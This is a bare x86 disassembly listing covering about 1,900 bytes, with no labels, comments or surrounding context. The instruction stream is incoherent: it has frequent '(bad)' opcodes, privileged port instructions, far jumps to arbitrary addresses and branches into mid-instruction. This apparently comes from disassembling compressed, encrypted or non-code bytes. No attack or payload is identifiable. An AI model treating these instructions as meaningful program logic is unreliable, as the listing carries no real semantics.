  4032bc:	fnsave [edx+0x16fba331]
  4032c2:	aad    0xdf
  4032c4:	fbld   TBYTE PTR [edx+0x37e7270b]
  4032ca:	les    edx,FWORD PTR [edx-0x27cf8e0a]
  4032d0:	sbb    bl,bl
  4032d2:	fdiv   st,st(7)
  4032d4:	mov    al,0x35
  4032d6:	adc    al,BYTE PTR [ebx]
  4032d8:	les    eax,FWORD PTR [ebx]
  4032da:	icebp  
  4032db:	inc    edx
  4032dc:	adc    ch,BYTE PTR [ecx]
  4032de:	ja     0x4032d8
  4032e0:	std    
  4032e1:	cmc    
  4032e2:	cmp    al,0xb3
  4032e4:	repnz pop eax
  4032e6:	aas    
  4032e7:	add    BYTE PTR [esi],bh
  4032e9:	mov    cl,0xd
  4032eb:	mov    eax,ds:0xee6d15ac
  4032f0:	(bad)  
  4032f1:	mov    esp,0x4bd32d85
  4032f6:	cdq    
  4032f7:	fstp   QWORD PTR [edx+0x24]
  4032fb:	cmp    eax,0x2b224a4
  403300:	iret   
  403301:	inc    esp
  403302:	mov    BYTE PTR [edi+0x27995169],dh
  403308:	pop    ecx
  403309:	in     al,dx
  40330a:	(bad)  
  40330b:	mul    BYTE PTR ds:0x3e30a4c9
  403311:	xchg   ebp,eax
  403312:	push   cs
  403313:	pop    es
  403314:	lds    ebp,FWORD PTR [edx+0x5c]
  403317:	push   0x837941a
  40331c:	sahf   
  40331d:	jecxz  0x403367
  40331f:	mov    esp,ecx
  403321:	dec    ecx
  403322:	lock xor al,0x63
  403325:	jno    0xb883b55f
  40332b:	adc    ebp,edx
  40332d:	sbb    eax,esi
  40332f:	pop    ds
  403330:	out    0xef,al
  403332:	not    BYTE PTR [ebx+eiz*2]
  403335:	cmp    eax,0xc2127b88
  40333a:	addr16 pop esp
  40333c:	dec    ebp
  40333d:	out    dx,eax
  40333e:	xor    ebp,ebp
  403340:	sub    DWORD PTR [ecx+0x1fa53a45],ebx
  403346:	jnp    0x403367
  403348:	adc    BYTE PTR [edi+0x18c2a982],bh
  40334e:	xor    ecx,DWORD PTR [edi+0x1876f06f]
  403354:	repnz mov dl,0xd8
  403357:	sub    DWORD PTR fs:[ecx],0xffffffbd
  40335b:	(bad)  
  40335c:	stc    
  40335d:	push   esp
  40335e:	stos   BYTE PTR es:[edi],al
  40335f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403360:	add    eax,0xc03e3090
  403365:	push   edx
  403366:	lock aad 0x65
  403369:	add    edx,ebp
  40336b:	ret    0xaafc
  40336e:	jnp    0x4033ee
  403370:	in     eax,dx
  403371:	pop    ds
  403372:	fcomp  QWORD PTR [ebp+0x9]
  403375:	inc    DWORD PTR ds:0x4a8a5226
  40337b:	je     0x403330
  40337d:	lds    ebp,FWORD PTR [edi+0x1c]
  403380:	fwait
  403381:	aad    0xba
  403383:	or     dl,al
  403385:	fcomp  QWORD PTR ss:[esi-0x4b]
  403389:	sbb    ebx,DWORD PTR [ecx-0x7b]
  40338c:	dec    esp
  40338d:	rcl    DWORD PTR [eax+0x670c0240],cl
  403393:	lds    esp,FWORD PTR [edx+0x21e7a3b]
  403399:	pop    esp
  40339a:	ja     0x40333b
  40339c:	sbb    ecx,DWORD PTR [eax+0x2b639f1f]
  4033a2:	xchg   ebp,eax
  4033a3:	aaa    
  4033a4:	adc    BYTE PTR [esi+0x37],bh
  4033a7:	addr16 dec ebx
  4033a9:	ja     0x4033d8
  4033ab:	jp     0x403364
  4033ad:	aaa    
  4033ae:	pop    esi
  4033af:	add    cl,BYTE PTR [ebp+0x66]
  4033b2:	mov    ch,0xd7
  4033b4:	mov    cs,WORD PTR [esi]
  4033b6:	mov    esp,0x5afb5f99
  4033bb:	sub    eax,0xf562b865
  4033c0:	sbb    BYTE PTR [ebp-0x298bd955],dl
  4033c6:	test   al,0xe6
  4033c8:	(bad)  
  4033c9:	inc    DWORD PTR [esi+eiz*2]
  4033cc:	(bad)  
  4033cd:	and    dl,BYTE PTR [esi-0x264f9fec]
  4033d3:	mov    ebp,0xbacea752
  4033d8:	inc    esi
  4033d9:	rcr    DWORD PTR [edi-0x7f],1
  4033dc:	mov    cl,0xe6
  4033de:	rcl    BYTE PTR [eax],0x93
  4033e1:	into   
  4033e2:	iret   
  4033e3:	cs cs pop ss
  4033e6:	jmp    0x1d31:0xe5d3b232
  4033ed:	push   0xa81613a6
  4033f2:	pop    edi
  4033f3:	jne    0x4033f1
  4033f5:	add    eax,0x87c03146
  4033fa:	push   ss
  4033fb:	fucom  st(2)
  4033fd:	sub    ecx,0xe2d7b719
  403403:	inc    ebx
  403404:	pop    esi
  403405:	jl     0x40345a
  403407:	mov    dl,0xf3
  403409:	lods   al,BYTE PTR ds:[esi]
  40340a:	xchg   esi,eax
  40340b:	mov    ebx,0x74def84b
  403410:	xchg   BYTE PTR [esi],ch
  403412:	test   al,0xba
  403414:	(bad)  
  403415:	jp     0x403409
  403417:	out    0x19,eax
  403419:	popa   
  40341a:	scas   al,BYTE PTR es:[edi]
  40341b:	into   
  40341c:	jb     0x4033e4
  40341e:	ja     0x40341c
  403420:	out    dx,eax
  403421:	mov    eax,ds:0xb5d2dff9
  403426:	(bad)  [ecx]
  403428:	dec    edi
  403429:	mov    ebp,DWORD PTR [ebx]
  40342b:	add    al,ch
  40342d:	int    0xd2
  40342f:	pusha  
  403430:	dec    ebx
  403431:	pop    ebp
  403432:	or     al,0xbf
  403434:	sti    
  403435:	pop    ss
  403436:	mov    bh,0x10
  403438:	adc    eax,ecx
  40343a:	jne    0x40347a
  40343c:	retf   0x27fe
  40343f:	jmp    0x265e3b01
  403444:	and    edx,DWORD PTR [esi]
  403446:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403447:	cmp    edx,DWORD PTR [ebp+0xec4f6c8]
  40344d:	or     DWORD PTR [edx+ecx*1-0x4f],edx
  403451:	pop    ebp
  403452:	es jnp 0x403468
  403455:	ds add dl,ah
  403458:	mov    eax,DWORD PTR [ebp+0x79f5a09a]
  40345e:	fdivr  QWORD PTR [esi]
  403460:	rcl    DWORD PTR [eax-0x42],0x11
  403464:	(bad)  
  403465:	ror    cl,cl
  403467:	loope  0x4033eb
  403469:	mov    dh,0xc8
  40346b:	call   0x5a2f9206
  403470:	pop    edx
  403471:	(bad)  
  403472:	lods   eax,DWORD PTR ds:[esi]
  403473:	(bad)  
  403474:	push   esi
  403475:	jae    0x403443
  403477:	mov    ?,WORD PTR [edi-0x5]
  40347a:	lock aaa 
  40347c:	mov    cl,0x5b
  40347e:	cdq    
  40347f:	pop    edx
  403480:	cdq    
  403481:	mov    dh,BYTE PTR [eax+0x6c]
  403484:	dec    ebp
  403485:	sahf   
  403486:	ins    BYTE PTR es:[edi],dx
  403487:	sahf   
  403488:	and    cl,BYTE PTR [edx+ebp*4+0x1e]
  40348c:	inc    eax
  40348d:	ror    di,0x81
  403491:	lock test eax,0x378fc22d
  403497:	fnstsw WORD PTR [ecx]
  403499:	dec    ebp
  40349a:	scas   al,BYTE PTR es:[edi]
  40349b:	and    BYTE PTR cs:[esi+0x2c],0xa3
  4034a0:	xor    ebp,esi
  4034a2:	mov    ss,WORD PTR [edx]
  4034a4:	test   BYTE PTR [esi+0x58],0x1f
  4034a8:	push   esp
  4034a9:	(bad)  
  4034ab:	lock adc DWORD PTR [edi-0x72e04543],edx
  4034b2:	mov    al,ds:0x9b0da11a
  4034b7:	cs jg  0x4034ad
  4034ba:	sub    bl,BYTE PTR [edi]
  4034bc:	xchg   ebx,eax
  4034bd:	xchg   edi,eax
  4034be:	lods   al,BYTE PTR ds:[esi]
  4034bf:	dec    esi
  4034c0:	out    0x9e,eax
  4034c2:	adc    eax,0x96292eb2
  4034c7:	xchg   esi,eax
  4034c8:	in     eax,0x24
  4034ca:	xchg   ebx,eax
  4034cb:	les    esi,FWORD PTR [esi+eax*8-0x44a08938]
  4034d2:	xor    eax,0xb02e6286
  4034d7:	and    cl,bh
  4034d9:	mov    dl,0xf6
  4034db:	pusha  
  4034dc:	jmp    0x31a98a44
  4034e1:	mov    ebx,esp
  4034e3:	xor    dh,ah
  4034e5:	repz fst st(6)
  4034e8:	mov    ds:0x8fecbc6a,eax
  4034ed:	push   esi
  4034ee:	jl     0x40353f
  4034f0:	and    eax,0x4ddf24ad
  4034f5:	outs   dx,DWORD PTR ds:[esi]
  4034f6:	dec    ebp
  4034f7:	fldenv [esi+0x7f]
  4034fa:	cld    
  4034fb:	ja     0x403561
  4034fd:	clc    
  4034fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4034ff:	xor    eax,0x3eee57d1
  403504:	sbb    cl,BYTE PTR ds:0x95cf268a
  40350a:	adc    esi,edx
  40350c:	enter  0xefac,0xf
  403510:	je     0x403549
  403512:	mov    esi,DWORD PTR [edi+edx*2+0x27c86a45]
  403519:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40351a:	daa    
  40351b:	outs   dx,BYTE PTR ds:[esi]
  40351c:	fmul   DWORD PTR [edi-0x666a33cf]
  403522:	stos   BYTE PTR es:[edi],al
  403523:	adc    edi,0xc37d0f2
  403529:	jg     0x403586
  40352b:	jmp    0x55b2d3ec
  403530:	inc    ebx
  403531:	rol    DWORD PTR [edi+edx*4],0xe8
  403535:	pop    ecx
  403536:	(bad)  
  403537:	lock xor ch,ch
  40353a:	add    eax,0xde696517
  40353f:	or     eax,0xaff156a7
  403544:	sbb    al,0x6f
  403546:	lea    esp,[edx]
  403548:	jne    0x403540
  40354a:	cs sub al,0x8
  40354d:	xchg   edi,eax
  40354e:	and    eax,0x6d16e98b
  403553:	loopne 0x4035c2
  403555:	xor    al,BYTE PTR [ebx+0x69]
  403558:	sbb    WORD PTR [edx+0x24],di
  40355c:	test   al,0x7
  40355e:	push   esp
  40355f:	push   0x9a4d905c
  403564:	push   ds
  403565:	jp     0x40351f
  403567:	jg     0x403566
  403569:	mov    dl,0x4e
  40356b:	mov    fs,WORD PTR [eax]
  40356d:	xchg   esp,eax
  40356e:	jne    0x403528
  403570:	(bad)  
  403571:	stos   DWORD PTR es:[edi],eax
  403572:	mov    eax,ds:0xb300785c
  403577:	in     al,0x4
  403579:	ja     0x40352a
  40357b:	push   ecx
  40357c:	cli    
  40357d:	(bad)  
  40357e:	dec    ebx
  40357f:	aad    0xe
  403581:	out    dx,al
  403582:	push   0x6f1ac2ce
  403587:	(bad)  
  403588:	xor    eax,0x69626445
  40358d:	push   cs
  40358e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40358f:	scas   eax,DWORD PTR es:[edi]
  403590:	ds stc 
  403592:	xor    al,0xd0
  403594:	adc    DWORD PTR [edi+ebp*1-0x59058b],ecx
  40359b:	out    dx,eax
  40359c:	repz and cl,0x55
  4035a0:	sub    eax,0xd1b79b53
  4035a5:	scas   al,BYTE PTR es:[edi]
  4035a6:	ss mov ebp,ecx
  4035a9:	aaa    
  4035aa:	sar    BYTE PTR ds:0xb4e096fd,0xce
  4035b1:	add    al,0xfe
  4035b3:	jbe    0x403563
  4035b5:	ja     0x403591
  4035b7:	dec    edx
  4035b8:	daa    
  4035b9:	mov    ds:0xb4f569fd,eax
  4035be:	push   es
  4035bf:	push   ecx
  4035c0:	jecxz  0x4035a5
  4035c2:	shr    BYTE PTR [ecx-0x3070d337],cl
  4035c8:	dec    ebx
  4035c9:	push   ebx
  4035ca:	sub    esp,DWORD PTR [ebx-0x32]
  4035cd:	xor    BYTE PTR [esi-0x2b],dl
  4035d0:	test   eax,0x5c6c3a7a
  4035d5:	in     al,0x1
  4035d7:	jle    0x403575
  4035d9:	loopne 0x40355d
  4035db:	pop    ecx
  4035dc:	push   ss
  4035dd:	or     dl,BYTE PTR [ebp-0x6c028351]
  4035e3:	cmp    dh,BYTE PTR [eax+0x19]
  4035e6:	mov    al,0x5a
  4035e8:	adc    al,bh
  4035ea:	push   ebx
  4035eb:	xchg   ebp,eax
  4035ec:	and    DWORD PTR [ecx+0x2f1e2172],ebp
  4035f2:	fidivr WORD PTR [ebx-0x55bff37b]
  4035f8:	imul   ebp,DWORD PTR [edx],0x46
  4035fb:	add    al,0x5a
  4035fd:	or     al,BYTE PTR [eax]
  4035ff:	sbb    bl,dl
  403601:	out    dx,al
  403602:	int    0xfe
  403604:	ja     0x403662
  403606:	fnsave [esi+0x76]
  403609:	xchg   BYTE PTR [edx-0x1e],al
  40360c:	inc    ebx
  40360d:	and    al,0x1e
  40360f:	sub    esp,ecx
  403611:	xchg   ch,bl
  403613:	popf   
  403614:	fisub  DWORD PTR [ecx+0xb]
  403617:	pop    eax
  403618:	stc    
  403619:	loopne 0x4035b4
  40361b:	in     eax,0xb1
  40361d:	or     BYTE PTR [esi+edx*4-0xe],ah
  403621:	fs pushf 
  403623:	pop    edx
  403624:	popf   
  403625:	pop    DWORD PTR [eax]
  403627:	bound  ebx,QWORD PTR [ebp-0x1fd8d485]
  40362d:	lahf   
  40362e:	cmp    dh,BYTE PTR [ebx-0x1c]
  403631:	mov    ch,bl
  403633:	add    al,0x5c
  403635:	rcr    DWORD PTR [edi+eax*4],cl
  403638:	jl     0x4035c0
  40363a:	ins    BYTE PTR es:[edi],dx
  40363b:	(bad)  
  40363c:	jg     0x403630
  40363e:	mov    eax,0x6a4c223e
  403643:	jb     0x403665
  403645:	mov    dl,0xa5
  403647:	outs   dx,DWORD PTR ds:[esi]
  403648:	and    bl,BYTE PTR [edi+0xa]
  40364b:	fidivr DWORD PTR [edx+0xc]
  40364e:	ins    DWORD PTR es:[edi],dx
  40364f:	adc    cl,BYTE PTR [esi-0x3f]
  403652:	cmp    ah,BYTE PTR [edi+0x3d]
  403655:	sbb    edx,DWORD PTR ds:0xe142b143
  40365b:	fwait
  40365c:	cli    
  40365d:	fwait
  40365e:	sbb    esi,DWORD PTR [eax]
  403660:	dec    edx
  403661:	(bad)  
  403662:	xchg   esi,eax
  403663:	jle    0x4035e6
  403665:	cmp    DWORD PTR [esp+eax*2-0x6a],edx
  403669:	outs   dx,DWORD PTR ds:[esi]
  40366a:	ja     0x4036ba
  40366c:	jo     0x40367f
  40366e:	xor    dh,BYTE PTR [ebx*2+0x2f473e88]
  403675:	retf   0x7e38
  403678:	and    ebp,DWORD PTR [edi]
  40367a:	push   edx
  40367b:	sbb    BYTE PTR [eax-0x7163296c],cl
  403681:	inc    edi
  403682:	cli    
  403683:	dec    ebp
  403684:	inc    ebx
  403685:	xor    BYTE PTR [ebx],ah
  403687:	cld    
  403688:	test   BYTE PTR ds:0x910415f,al
  40368e:	dec    ebx
  40368f:	std    
  403690:	fwait
  403691:	cs ret 
  403693:	dec    esp
  403694:	jecxz  0x40362f
  403696:	loopne 0x403628
  403698:	cmc    
  403699:	pop    es
  40369a:	lock mov ch,0xb3
  40369d:	stos   BYTE PTR es:[edi],al
  40369e:	and    esi,DWORD PTR [esi+0x13fd6c92]
  4036a4:	ins    DWORD PTR es:[edi],dx
  4036a5:	inc    ebp
  4036a6:	adc    dh,al
  4036a8:	sahf   
  4036a9:	mov    ch,0xcf
  4036ab:	imul   ebp,DWORD PTR [eax],0x5f7691a3
  4036b1:	outs   dx,BYTE PTR ds:[esi]
  4036b2:	pop    edx
  4036b3:	add    DWORD PTR [ecx-0x74],edi
  4036b6:	or     BYTE PTR [eax],0x90
  4036b9:	cmp    eax,0xdc5bed6f
  4036be:	xlat   BYTE PTR ds:[ebx]
  4036bf:	lahf   
  4036c0:	mov    eax,0xb742e99a
  4036c5:	ins    DWORD PTR es:[edi],dx
  4036c6:	(bad)  
  4036c7:	lahf   
  4036c8:	sub    eax,DWORD PTR [edi]
  4036ca:	xor    cl,dh
  4036cc:	ins    DWORD PTR es:[edi],dx
  4036cd:	jne    0x40374d
  4036cf:	jle    0x40368d
  4036d1:	cs (bad) 
  4036d3:	or     eax,DWORD PTR [esi-0x45]
  4036d6:	jle    0x403714
  4036d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4036d9:	push   edx
  4036da:	pop    ebx
  4036db:	scas   eax,DWORD PTR es:[edi]
  4036dc:	add    cl,BYTE PTR [eax]
  4036de:	icebp  
  4036df:	mov    dh,0x15
  4036e1:	fsub   st,st(5)
  4036e3:	pop    eax
  4036e4:	dec    ebp
  4036e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4036e6:	push   es
  4036e7:	mov    al,ds:0xe2a3a9de
  4036ec:	mov    BYTE PTR [ecx],dh
  4036ee:	sub    BYTE PTR [edx],0x85
  4036f1:	add    eax,0xb2c4d395
  4036f6:	test   DWORD PTR [edi+edx*4-0x6acdec81],eax
  4036fd:	in     al,dx
  4036fe:	mov    WORD PTR [ebx],ds
  403700:	es push esi
  403702:	mov    ebp,0x879a4a6f
  403707:	cmp    cl,BYTE PTR [eax]
  403709:	and    BYTE PTR [edx],dh
  40370b:	cmp    ecx,DWORD PTR [ebp+0x376cbe37]
  403711:	cmp    ch,BYTE PTR [edi+0x35]
  403714:	out    dx,al
  403715:	aas    
  403716:	(bad)  
  403717:	mov    ch,0x50
  403719:	sub    esi,esi
  40371b:	lods   al,BYTE PTR ds:[esi]
  40371c:	lock xchg edx,eax
  40371e:	and    edi,esi
  403720:	add    DWORD PTR [ebp-0x41],esp
  403723:	rcl    edi,cl
  403725:	into   
  403726:	pop    eax
  403727:	in     al,0x3b
  403729:	mov    bl,0x16
  40372b:	dec    ecx
  40372c:	les    ebx,FWORD PTR [ecx]
  40372e:	cdq    
  40372f:	int    0x2b
  403731:	outs   dx,BYTE PTR ds:[esi]
  403732:	lea    ecx,[edi-0x34745cdd]
  403738:	cmp    esi,DWORD PTR [edx+0x52039a37]
  40373e:	adc    BYTE PTR [esp+esi*2-0x4fd1df85],0xc6
  403746:	xor    al,0x34
  403748:	(bad)  
  403749:	test   BYTE PTR [edx-0x75],al
  40374c:	arpl   si,cx
  40374e:	fwait
  40374f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403750:	out    dx,al
  403751:	pop    ss
  403752:	aam    0xc0
  403754:	push   ebx
  403755:	and    ecx,DWORD PTR ds:0xce583791
  40375b:	cdq    
  40375c:	aas    
  40375d:	pop    ss
  40375e:	ins    DWORD PTR es:[edi],dx
  40375f:	jmp    0x4036f6
  403761:	int    0x84
  403763:	xor    bl,BYTE PTR [ebx+0x5139cdbc]
  403769:	out    0x66,al
  40376b:	cmp    BYTE PTR [edx-0x4043c1d5],dh
  403771:	cmp    eax,DWORD PTR [esi]
  403773:	js     0x40379d
  403775:	cmc    
  403776:	sub    eax,0x52825830
  40377b:	lods   eax,DWORD PTR ds:[esi]
  40377c:	sahf   
  40377d:	push   0xc550345c
  403782:	cmc    
  403783:	jl     0x40372e
  403785:	mov    dl,0x5e
  403787:	cmp    ebx,DWORD PTR [esi+0x31]
  40378a:	(bad)  
  40378b:	sbb    edi,DWORD PTR [edx]
  40378d:	lods   eax,DWORD PTR ds:[esi]
  40378e:	outs   dx,BYTE PTR ds:[esi]
  40378f:	sub    eax,0x97035f0d
  403794:	xchg   ecx,eax
  403795:	mul    DWORD PTR [ecx-0x1bb6b8ad]
  40379b:	dec    esi
  40379c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40379d:	sbb    esp,ecx
  40379f:	(bad)  
  4037a0:	jnp    0x403759
  4037a2:	xchg   ebx,eax
  4037a3:	(bad)  
  4037a4:	mov    ds:0xce883197,al
  4037a9:	dec    ecx
  4037aa:	dec    ebp
  4037ab:	sub    eax,0xbb2a745e
  4037b0:	iret   
  4037b1:	cmp    ebx,DWORD PTR [eax+0x46edf91b]
  4037b7:	cdq    
  4037b8:	inc    ebx
  4037b9:	loope  0x40375e
  4037bb:	cmc    
  4037bc:	xor    al,0x98
  4037be:	loop   0x4037c0
  4037c0:	adc    edx,0xa7a94d4c
  4037c6:	loop   0x40374d
  4037c8:	sbb    al,0xab
  4037ca:	shl    DWORD PTR [edi],0x80
  4037cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4037ce:	in     al,0x80
  4037d0:	inc    ecx
  4037d1:	sbb    al,0xab
  4037d3:	hlt    
  4037d4:	hlt    
  4037d5:	clc    
  4037d6:	leave  
  4037d7:	push   ebp
  4037d8:	xor    esp,edx
  4037da:	mov    dh,0x50
  4037dc:	cmp    dl,0x74
  4037df:	mov    al,0x79
  4037e1:	rol    esp,0x30
  4037e4:	ins    BYTE PTR es:[edi],dx
  4037e5:	inc    eax
  4037e6:	pop    eax
  4037e7:	xchg   ecx,eax
  4037e8:	call   DWORD PTR [eax]
  4037ea:	repz out 0x5e,eax
  4037ed:	xchg   DWORD PTR ds:0xc03c0221,eax
  4037f3:	xchg   DWORD PTR [edi+0x49c39a47],esp
  4037f9:	mov    eax,ds:0xaf471839
  4037fe:	daa    
  4037ff:	(bad)
  403802:	and    al,0x52
  403804:	and    bl,BYTE PTR [ebx]
  403806:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403807:	popa   
  403808:	push   esi
  403809:	mov    dl,dh
  40380b:	xchg   ecx,eax
  40380c:	daa    
  40380d:	sti    
  40380e:	jmp    0x4037d9
  403810:	enter  0x1438,0x3d
  403814:	cmp    BYTE PTR [ecx+0x49dfdf0c],ah
  40381a:	in     eax,0xc3
  40381c:	jo     0x4037e2
  40381e:	clc    
  40381f:	cmp    ecx,0xffffff9f
  403822:	outs   dx,BYTE PTR ds:[esi]
  403823:	pop    eax
  403824:	pushf  
  403825:	mov    BYTE PTR [ecx],ah
  403827:	(bad)  
  403829:	mov    ds:0x1ebc115d,al
  40382e:	adc    edx,DWORD PTR [edi]
  403830:	mov    eax,0xfa1079e3
  403835:	add    edx,ebx
  403837:	hlt    
  403838:	or     DWORD PTR [ebx],esi
  40383a:	loope  0x4037c0
  40383c:	and    edi,DWORD PTR [ebx+ecx*8+0xf302a51]
  403843:	mov    edi,0x37328d29
  403848:	xor    BYTE PTR [ebx-0x104de111],0xb1
  40384f:	sub    al,dh
  403851:	mov    edi,0x9cfdbb97
  403856:	arpl   WORD PTR [edi],cx
  403858:	inc    ebx
  403859:	mov    cl,0x84
  40385b:	and    DWORD PTR [esi],esp
  40385d:	addr16 loope 0x40387c
  403860:	sbb    ebx,edx
  403862:	pop    edi
  403863:	test   BYTE PTR [edi-0x51],cl
  403866:	xchg   edx,eax
  403867:	and    ah,bl
  403869:	ror    DWORD PTR [ebp+0x50],cl
  40386c:	adc    esp,DWORD PTR [esi+0x330f0213]
  403872:	in     al,0x67
  403874:	fs ret 
  403876:	or     eax,0x8d733d4a
  40387b:	rcr    DWORD PTR [esi-0x3f],0x6a
  40387f:	and    al,BYTE PTR [eax-0x3a3c8828]
  403885:	in     al,dx
  403886:	pop    ebp
  403887:	daa    
  403888:	inc    eax
  403889:	sbb    BYTE PTR [esi-0xcc9ebf8],dl
  40388f:	nop
  403890:	cmp    eax,0xcc03da03
  403895:	stos   BYTE PTR es:[edi],al
  403896:	and    ebp,edx
  403898:	push   0x40619553
  40389d:	outs   dx,BYTE PTR ds:[esi]
  40389e:	push   edi
  40389f:	out    dx,al
  4038a0:	fst    DWORD PTR [edx]
  4038a2:	xchg   edx,eax
  4038a3:	jge    0x403919
  4038a5:	jecxz  0x403902
  4038a7:	imul   eax,DWORD PTR [eax],0x19f2aceb
  4038ad:	loop   0x40388a
  4038af:	out    0x33,al
  4038b1:	test   DWORD PTR [esi],ebx
  4038b3:	add    al,0x2c
  4038b5:	aaa    
  4038b6:	out    dx,eax
  4038b7:	xor    BYTE PTR [esi],0xec
  4038ba:	shr    dh,cl
  4038bc:	lods   al,BYTE PTR ds:[esi]
  4038bd:	sar    BYTE PTR [edx-0x4f],cl
  4038c0:	push   ecx
  4038c1:	loopne 0x4038ef
  4038c3:	lods   eax,DWORD PTR ds:[esi]
  4038c4:	push   esp
  4038c5:	fcomp  DWORD PTR [edx+0x8f202ac]
  4038cb:	sbb    DWORD PTR [esi+0x4],ebp
  4038ce:	xlat   BYTE PTR ds:[ebx]
  4038cf:	shl    DWORD PTR [edi-0x1eeaab0a],0x4a
  4038d6:	lods   al,BYTE PTR ds:[esi]
  4038d7:	inc    esi
  4038d8:	add    BYTE PTR [edx-0x79549f09],0x21
  4038df:	int    0xa2
  4038e1:	aas    
  4038e2:	xchg   ah,ah
  4038e4:	pop    ebx
  4038e5:	adc    DWORD PTR [edi],edi
  4038e7:	mov    ch,0x5b
  4038e9:	mov    edx,0xe1e530bb
  4038ee:	fdivr  DWORD PTR [eax-0x50]
  4038f1:	cmp    DWORD PTR [ecx],esi
  4038f3:	int    0x8f
  4038f5:	retf   0xa07b
  4038f8:	loop   0x4038f5
  4038fa:	jb     0x4038ef
  4038fc:	lods   eax,DWORD PTR ds:[esi]
  4038fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4038fe:	xor    eax,0x23c8edf9
  403903:	jno    0x40389d
  403905:	repz inc ebp
  403907:	mov    eax,ds:0xe3ee1ef1
  40390c:	shr    BYTE PTR [esi+0x4e],cl
  40390f:	loope  0x4038b9
  403911:	js     0x4038ee
  403913:	add    eax,0x2b388faf
  403918:	pop    eax
  403919:	and    edx,0x7f
  40391c:	iret   
  40391d:	jl     0x4038d5
  40391f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403920:	les    edx,FWORD PTR [esi+0x62]
  403923:	inc    edx
  403924:	and    eax,0xb03f15c1
  403929:	in     eax,dx
  40392a:	cmc    
  40392b:	sub    DWORD PTR [esi],ebx
  40392d:	lods   eax,DWORD PTR ds:[esi]
  40392e:	pop    ebp
  40392f:	dec    esp
  403930:	jg     0x40398a
  403932:	(bad)  
  403933:	xchg   ebp,eax
  403934:	popa   
  403935:	dec    ebp
  403936:	retf   
  403937:	shl    bh,0x9c
  40393a:	aad    0xb1
  40393c:	jns    0x4038c5
  40393e:	jmp    0x4038e0
  403940:	and    edx,DWORD PTR [ebx+0x1d]
  403943:	(bad)  
  403945:	int3   
  403946:	scas   ax,WORD PTR es:[edi]
  403948:	lods   eax,DWORD PTR ds:[esi]
  403949:	add    DWORD PTR [edi+0x60854a3c],ebp
  40394f:	out    dx,eax
  403950:	mov    bh,0x2
  403952:	in     eax,0x43
  403954:	inc    ecx
  403955:	sub    ecx,esp
  403957:	mov    ?,eax
  403959:	mov    esp,0xd050603c
  40395e:	sahf   
  40395f:	mov    ebp,DWORD PTR [edx]
  403961:	loope  0x403901
  403963:	dec    esp
  403964:	fwait
  403965:	mov    cl,0x50
  403967:	cmp    ebx,edi
  403969:	jg     0x403954
  40396b:	or     ah,bh
  40396d:	xor    esi,edi
  40396f:	pop    es
  403970:	inc    ebx
  403971:	jns    0x40390f
  403973:	int3   
  403974:	mov    al,0xd9
  403976:	jge    0x40396e
  403978:	add    edi,DWORD PTR [edx-0x5b]
  40397b:	imul   ecx,edx,0x5b151c17
  403981:	rol    DWORD PTR [ecx],0x76
  403984:	stos   DWORD PTR es:[edi],eax
  403985:	adc    eax,0x86230e01
  40398a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40398b:	xchg   DWORD PTR [ecx+0x31ddeb7e],esi
  403991:	int3   
  403992:	sti    
  403993:	hlt    
  403994:	std    
  403995:	mov    ebx,0x99508622
  40399a:	std    
  40399b:	xchg   ebp,eax
  40399c:	add    eax,0x86574d89
  4039a1:	xchg   esp,eax
  4039a2:	dec    edx
  4039a3:	xlat   BYTE PTR ds:[ebx]
  4039a4:	fnstsw WORD PTR [eax]
  4039a6:	sbb    dl,dl
  4039a8:	not    DWORD PTR [edx]
  4039aa:	lock fsubr QWORD PTR ds:0x168d0375
  4039b1:	repnz outs dx,BYTE PTR ds:[esi]
  4039b3:	les    ebp,FWORD PTR [ebx+0x3baddb30]
  4039b9:	clc    
  4039ba:	inc    esi
  4039bb:	shr    dl,cl
  4039bd:	stos   DWORD PTR es:[edi],eax
  4039be:	add    eax,0xd08efbe7
  4039c3:	or     DWORD PTR [ebx-0x3c],ecx
  4039c6:	mov    cs,WORD PTR [esi+0x2c0686b4]
  4039cc:	inc    eax
  4039cd:	and    al,0x61
  4039cf:	adc    al,0xe2
  4039d1:	btr    DWORD PTR [ebx+0x3b],ebx
  4039d5:	push   ebx
  4039d6:	and    esi,ebp
  4039d8:	popa   
  4039d9:	or     eax,0xed365f5b
  4039de:	pusha  
  4039df:	popf   
  4039e0:	(bad)  
  4039e1:	popf   
  4039e2:	enter  0x507e,0x6e
  4039e6:	div    BYTE PTR [edx-0x1adb4cf6]
  4039ec:	xor    al,0xbe
  4039ee:	les    esp,FWORD PTR [edx+ecx*1-0x39]
  4039f2:	adc    al,0x5f
  4039f4:	hlt    
  4039f5:	jnp    0x403a12
  4039f7:	or     al,0xd2
  4039f9:	test   eax,0x9306f2df
  4039fe:	cdq    
  4039ff:	(bad)  
  403a00:	out    0xe3,al
  403a02:	lahf   
  403a03:	push   edx
  403a04:	popf   
  403a05:	cdq    
  403a06:	or     al,0x82
  403a09:	fldcw  WORD PTR [ebx-0x667b110f]
  403a0f:	adc    BYTE PTR [esi+eiz*1-0x53],cl
  403a13:	and    cl,0xb9
  403a16:	out    0x21,eax
  403a18:	in     eax,dx
  403a19:	sub    bh,ch
  403a1b:	add    eax,0x4ec1c28a
  403a20:	gs sbb bh,bh
  403a23:	xor    edx,ebx
  403a25:	lods   eax,DWORD PTR ds:[esi]
  403a26:	cld    
  403a27:	data16 sbb BYTE PTR [ecx],0xcc
  403a2b:	push   ss
  403a2c:	call   0xf19b:0x259be154
  403a33:	mov    eax,ds:0x875dc3c5
  403a38:	fmul   DWORD PTR [ebp+eax*4-0x51]
  403a3c:	jns    0x403a40
  403a3e:	jge    0x4039e1
  403a40:	adc    ah,dl
  403a42:	xchg   BYTE PTR [eax-0x5a2b53e4],dh
